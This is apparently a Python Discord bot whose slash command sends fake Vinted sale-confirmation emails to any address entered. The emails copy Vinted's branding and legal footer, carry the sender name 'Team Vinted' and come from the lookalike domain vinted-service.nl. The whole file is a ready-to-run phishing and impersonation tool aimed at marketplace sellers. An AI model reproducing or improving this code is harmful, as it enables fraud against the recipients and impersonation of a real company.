import discord
from discord import app_commands
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ─── CONFIG (via Railway omgevingsvariabelen) ────────────────────────────────
DISCORD_TOKEN  = os.environ.get("DISCORD_TOKEN")   # je Discord bot token
SMTP_USER      = os.environ.get("SMTP_USER")        # noreply@vinted-service.nl
SMTP_PASSWORD  = os.environ.get("SMTP_PASSWORD")    # je One.com wachtwoord
SMTP_HOST      = "send.one.com"
SMTP_PORT      = 587
# ────────────────────────────────────────────────────────────────────────────

intents = discord.Intents.default()
client  = discord.Client(intents=intents)
tree    = app_commands.CommandTree(client)


def build_html_email(seller: str, buyer: str, product: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
</head>
<body style="margin:0;padding:0;background:#ffffff;">
<table border="0" width="100%" cellspacing="0" cellpadding="0"
       style="font-family:Helvetica,sans-serif;max-width:680px;margin:0 auto;">
  <tbody>

    <!-- LOGO -->
    <tr>
      <td style="padding:0 25px;height:110px;vertical-align:middle;">
        <a href="https://vinted.nl/" target="_blank">
          <img src="https://static-assets.vinted.com/images/email/_shared/logo/default.png"
               height="30" border="0" alt="Vinted"
               style="display:block;height:30px;" />
        </a>
      </td>
    </tr>

    <!-- GREETING -->
    <tr>
      <td style="padding:0 25px;font-family:Helvetica,sans-serif;
                 font-size:18px;color:rgb(51,51,51);line-height:27px;">
        <b>Hello {seller},</b>
      </td>
    </tr>

    <tr><td style="height:18px;">&nbsp;</td></tr>

    <!-- PURCHASE LINE -->
    <tr>
      <td style="padding:0 25px;font-family:Helvetica,sans-serif;
                 font-size:18px;color:rgb(51,51,51);line-height:27px;">
        <b>{buyer}</b> has bought <b>{product}</b>.
      </td>
    </tr>

    <tr><td style="height:27px;">&nbsp;</td></tr>

    <!-- BODY TEXT -->
    <tr>
      <td style="padding:0 25px;font-family:Helvetica,sans-serif;
                 font-size:18px;color:rgb(51,51,51);line-height:27px;">
        We will transfer the buyer's payment to your Vinted Balance once the order is completed.
      </td>
    </tr>

    <tr><td style="height:18px;">&nbsp;</td></tr>

    <tr>
      <td style="padding:0 25px;font-family:Helvetica,sans-serif;
                 font-size:18px;color:rgb(51,51,51);line-height:27px;">
        Please send this order within 5 days.<br>
        Here's what you need to do:
      </td>
    </tr>

    <tr><td style="height:10px;">&nbsp;</td></tr>

    <!-- STEPS -->
    <tr>
      <td style="padding:0 25px;">
        <ol style="font-family:Helvetica,sans-serif;font-size:16px;
                   color:rgb(51,51,51);line-height:22px;
                   margin:0;padding-left:20px;">
          <li style="margin-bottom:8px;">
            Go to the <a href="#" style="color:rgb(0,119,130);text-decoration:underline;">message thread</a>
            between you and the buyer to generate your shipping label.
          </li>
          <li style="margin-bottom:8px;">
            Follow the first steps on Vinted, and then the final steps in the email
            that arrives after your label is created.
          </li>
          <li style="margin-bottom:8px;">
            If you need to print the label and attach it, always make sure there is no tape
            covering the barcode - even clear tape can get in the way of scanning.
            You can use your own packaging, or buy a separate envelope or box.
          </li>
        </ol>
      </td>
    </tr>

    <tr><td style="height:27px;">&nbsp;</td></tr>

    <!-- ALSO GOOD IDEA -->
    <tr>
      <td style="padding:0 25px;font-family:Helvetica,sans-serif;
                 font-size:18px;color:rgb(51,51,51);line-height:27px;">
        It's also a good idea to get in touch with <b>{buyer}</b>
        and let them know when you've sent the item.
      </td>
    </tr>

    <tr><td style="height:18px;">&nbsp;</td></tr>

    <!-- SIGN OFF -->
    <tr>
      <td style="padding:0 25px;font-family:Helvetica,sans-serif;
                 font-size:18px;color:rgb(51,51,51);line-height:27px;">
        Team Vinted
      </td>
    </tr>

    <tr><td style="height:30px;">&nbsp;</td></tr>

    <!-- FOOTER IMAGE -->
    <tr>
      <td style="text-align:right;background:#ffffff;">
        <img src="https://static-assets.vinted.com/admin/editor_assets/en/subtract-footer.png"
             width="680" border="0"
             style="display:block;max-width:680px;width:100%;" />
      </td>
    </tr>

    <!-- FOOTER LEGAL -->
    <tr>
      <td style="background:rgb(245,246,247);padding:20px 25px;
                 font-family:Helvetica,sans-serif;font-size:12px;
                 line-height:16px;color:rgb(153,153,153);">
        We are required to send you this email in order to fulfill our
        <a href="https://www.vinted.nl/terms_and_conditions" target="_blank"
           style="color:rgb(51,51,51);text-decoration:underline;">Terms and Conditions</a>,
        or for other legal reasons. It is not possible to unsubscribe from these emails.
        To read up on your rights and more detailed information on how we use your personal data,
        please see our
        <a href="https://www.vinted.nl/privacy-policy" target="_blank"
           style="color:rgb(51,51,51);text-decoration:underline;">Privacy Policy</a>.
      </td>
    </tr>

    <tr><td style="background:rgb(245,246,247);height:64px;">&nbsp;</td></tr>

  </tbody>
</table>
</body>
</html>"""


def send_email(to_address: str, seller: str, buyer: str, product: str):
    msg = MIMEMultipart("alternative")
    msg["Subject"] = "You've sold an item on Vinted"
    msg["From"]    = f"Team Vinted <{SMTP_USER}>"
    msg["To"]      = to_address

    html_content = build_html_email(seller, buyer, product)
    msg.attach(MIMEText(html_content, "html", "utf-8"))

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
        server.ehlo()
        server.starttls()
        server.login(SMTP_USER, SMTP_PASSWORD)
        server.sendmail(SMTP_USER, to_address, msg.as_string())


# ─── MODAL ──────────────────────────────────────────────────────────────────
class VintedModal(discord.ui.Modal, title="Vinted Mail Versturen"):

    seller = discord.ui.TextInput(
        label="Naam verkoper (ontvanger)",
        placeholder="bijv. wlucien90",
        required=True,
        max_length=100,
    )
    buyer = discord.ui.TextInput(
        label="Naam koper",
        placeholder="bijv. sandravangaal",
        required=True,
        max_length=100,
    )
    product = discord.ui.TextInput(
        label="Productnaam",
        placeholder="bijv. Samsung Galaxy S23 Ultra 256GB",
        required=True,
        max_length=200,
    )
    recipient_email = discord.ui.TextInput(
        label="E-mailadres ontvanger",
        placeholder="bijv. verkoper@hotmail.com",
        required=True,
        max_length=200,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True, thinking=True)

        seller_val  = self.seller.value.strip()
        buyer_val   = self.buyer.value.strip()
        product_val = self.product.value.strip()
        email_val   = self.recipient_email.value.strip()

        try:
            send_email(email_val, seller_val, buyer_val, product_val)

            embed = discord.Embed(
                title="✅ Mail verstuurd!",
                color=0x007782,
            )
            embed.add_field(name="Naar",     value=email_val,   inline=False)
            embed.add_field(name="Verkoper", value=seller_val,  inline=True)
            embed.add_field(name="Koper",    value=buyer_val,   inline=True)
            embed.add_field(name="Product",  value=product_val, inline=False)
            embed.set_footer(text="Verstuurd via noreply@vinted-service.nl")

            await interaction.followup.send(embed=embed, ephemeral=True)

        except Exception as e:
            await interaction.followup.send(
                f"❌ Er ging iets mis bij het versturen:\n```{e}```",
                ephemeral=True,
            )

    async def on_error(self, interaction: discord.Interaction, error: Exception):
        await interaction.response.send_message(
            "❌ Onverwachte fout. Probeer het opnieuw.", ephemeral=True
        )


# ─── SLASH COMMAND ──────────────────────────────────────────────────────────
@tree.command(name="vinted", description="Stuur een Vinted verkoopbevestiging")
async def vinted_command(interaction: discord.Interaction):
    await interaction.response.send_modal(VintedModal())


# ─── BOT EVENTS ─────────────────────────────────────────────────────────────
@client.event
async def on_ready():
    await tree.sync()
    print(f"✅ Bot online als {client.user} — slash commands gesynchroniseerd")


client.run(DISCORD_TOKEN)
